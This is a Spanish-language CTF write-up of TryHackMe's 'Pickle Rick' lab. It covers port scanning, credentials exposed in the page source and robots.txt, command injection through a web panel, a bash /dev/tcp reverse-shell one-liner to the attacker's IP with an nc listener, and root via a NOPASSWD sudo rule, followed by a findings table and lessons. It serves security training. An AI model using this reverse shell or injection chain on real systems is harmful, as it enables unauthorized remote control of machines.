# 🛡️ **Writeup: Pickle Rick**  
*Un ejercicio práctico de Ethical Hacking en el entorno de TryHackMe*

## 📌 **Descripción de la Máquina**

**Nombre**: Pickle Rick  
**Plataforma**: TryHackMe (https://tryhackme.com)  
**Dificultad**: Principiante  
**Objetivo**: Recuperar todos los ingredientes necesarios para revertir el proceso de "pickle" de Rick, demostrando técnicas de reconocimiento, explotación y escalada de privilegios.  
**IP Objetivo**: 10.10.238.80  
**Fecha del Análisis**: 11 de agosto de 2025

---

## 🔍 **Metodología Utilizada**

Para este análisis de seguridad, se siguió una metodología estructurada basada en el estándar OSSTMM (Open Source Security Testing Methodology Manual), organizada en las siguientes fases:

1. **Reconocimiento y Descubrimiento**
2. **Enumeración y Análisis de Servicios**
3. **Explotación de Vulnerabilidades**
4. **Post-Explotación y Escalada de Privilegios**
5. **Documentación de Hallazgos**

---

## 📡 **1. Reconocimiento y Descubrimiento**

### **Escaneo de Puertos con Nmap**

Se inició el análisis con un escaneo exhaustivo de puertos utilizando Nmap para identificar servicios expuestos:

```bash
sudo nmap -sV -p- 10.10.238.80 -v
```

**Resultados del Escaneo:**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-11 21:44 CEST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 21:44
Scanning 10.10.238.80 [4 ports]
Completed Ping Scan at 21:44, 0.07s elapsed (1 total hosts)
Scanning 10.10.238.80 [65535 ports]
Discovered open port 22/tcp on 10.10.238.80
Discovered open port 80/tcp on 10.10.238.80

Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Análisis de Resultados:**
- **Puerto 22 (SSH)**: Servicio OpenSSH 8.2p1 en Ubuntu. Este servicio suele ser objetivo común para ataques de fuerza bruta, pero en este caso requeriría credenciales válidas.
- **Puerto 80 (HTTP)**: Servidor web Apache 2.4.41 en Ubuntu. Este es el punto de entrada principal para el análisis.

---

## 🔎 **2. Enumeración y Análisis de Servicios**

### **Enumeración del Servicio Web (Puerto 80)**

Tras identificar el servidor web, se procedió a una enumeración detallada:

1. **Acceso a la página principal**:
   - Se identificó una interfaz web temática de Rick and Morty.
   - Contenía referencias a un "Portal de Rick" y menciones a "ingredientes".

2. **Análisis del código fuente**:
   - Al revisar el código fuente de la página principal (index.html), se identificó una pista crítica:
```html
<!-- R1ckRul3s -->
```
   - **Hallazgo**: Nombre de usuario válido para el sistema.

3. **Análisis de `robots.txt`**:
```bash
curl http://10.10.238.80/robots.txt
```
```
Wubbalubbadubdub
```

   - **Hallazgo**: Cadena sospechosa que podría ser una credencial o pista.

4. **Pruebas Manuales de Autenticación**:
- Basado en las pistas encontradas (usuario en el código fuente y cadena en robots.txt), se probaron credenciales:
	- Usuario: `R1ckRul3s` (encontrado en el código fuente de la página principal)
	- Contraseña: `Wubbalubbadubdub` (encontrada en robots.txt)
- **Resultado**: Autenticación exitosa con redirección a `/portal.php`.

5. **Análisis del Command Panel**:
   - Se identificó un panel de comandos en `/portal.php` que permitía ejecutar comandos del sistema.
   - Se confirmó Command Injection al ejecutar:
```bash
ls
whoami
id
```

---

## 💥 **3. Explotación de Vulnerabilidades**

### **Command Injection**

El Command Panel permitía ejecutar comandos del sistema directamente, lo que representa una vulnerabilidad crítica de Command Injection.

**Hallazgos Clave:**
- Comando `cat` estaba bloqueado con el mensaje:
  ```
  Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
  ```
- Se utilizaron alternativas para leer archivos:
  ```bash
  ls /home/rick
  less /home/rick/second\ ingredients
  ```

### **Obtención de Reverse Shell**

Para obtener un control más completo del sistema, se implementó una Reverse Shell:

**En la máquina atacante:**
```bash
nc -nvlp 4444
```

**En el Command Panel:**
```bash
bash -c 'exec bash -i &>/dev/tcp/10.14.104.220/4444 <&1'
```

**Resultado:**
- Conexión exitosa a la shell inversa.
- Acceso interactivo al sistema como usuario `www-data`.

---

## ⚙️ **4. Post-Explotación y Escalada de Privilegios**

### **Enumeración del Sistema**

Tras obtener acceso al sistema, se realizó una enumeración detallada:

```bash
whoami
id
pwd
ls -la /home/rick/
```

**Hallazgos Relevantes:**
- Directorio `/home/rick/` contenía archivos críticos.
- Usuario `www-data` tenía permisos limitados.

### **Escalada de Privilegios**

Se investigó la posibilidad de escalar privilegios mediante el comando `sudo`:

```bash
sudo -l
```

**Resultado:**
```
Matching Defaults entries for www-data on ip-10-10-238-80:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-238-80:
    (ALL) NOPASSWD: ALL
```

**Explotación:**
- Se aprovechó la configuración insegura de sudo para obtener acceso root sin contraseña:
  ```bash
  sudo su -
  ```

**Verificación:**
```bash
whoami
```
```
root
```

### **Recuperación de Información Sensible**

Con acceso root, se procedió a recuperar todos los ingredientes requeridos:

```bash
ls -la /home/rick/
cat /home/rick/second\ ingredients
cat /home/rick/another_important_file
```

---

## 📊 **5. Hallazgos de Seguridad**

### **Vulnerabilidades Críticas Identificadas**

| Nivel | Vulnerabilidad | Impacto | Estado |
|-------|----------------|---------|--------|
| Crítico | Command Injection en el Command Panel | Acceso remoto completo al sistema | No mitigado |
| Alto | Credenciales débiles expuestas | Acceso no autorizado al panel de administración | No mitigado |
| Alto | Configuración insegura de sudo (NOPASSWD: ALL) | Escalada de privilegios trivial | No mitigado |
| Medio | Información sensible expuesta en código fuente y robots.txt | Facilita la autenticación no autorizada | No mitigado |

### **Resumen de Impacto**

El sistema presentaba múltiples vulnerabilidades que, combinadas, permitían:
1. Obtener credenciales válidas a través de información expuesta en el código fuente y robots.txt
2. Acceder a un panel con Command Injection
3. Establecer una shell remota
4. Escalar a privilegios root sin contraseña

Esto representa un riesgo extremo para la integridad, confidencialidad y disponibilidad del sistema.

---
## 📌 **Conclusión**

La máquina "Pickle Rick" presentaba múltiples vulnerabilidades de seguridad que, en un entorno real, habrían permitido a un atacante obtener acceso completo al sistema. La combinación de credenciales débiles expuestas en el código fuente y en `robots.txt`, Command Injection y una configuración insegura de sudo creó un escenario de alto riesgo.

Este ejercicio demuestra la importancia crítica de:
- No exponer información sensible en el código fuente
- No implementar funcionalidades peligrosas como Command Panels en entornos web
- Implementar controles de acceso adecuados
- Realizar revisiones regulares de configuraciones de seguridad

Aunque este entorno era intencionalmente vulnerable como ejercicio de CTF, los mismos principios se aplican a sistemas reales donde estas vulnerabilidades pueden tener consecuencias graves.

---

## 📚 **Recursos Adicionales**

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [NIST SP 800-115: Technical Guide to Information Security Testing and Assessment](https://csrc.nist.gov/publications/detail/sp/800-115/final)
- [Sudoers Manual](https://www.sudo.ws/man/1.8.15/sudoers.man.html)
- [Nmap Documentation](https://nmap.org/book/)

---

*Documento elaborado por: @juanma-cc
Fecha: 11 de agosto de 2025* 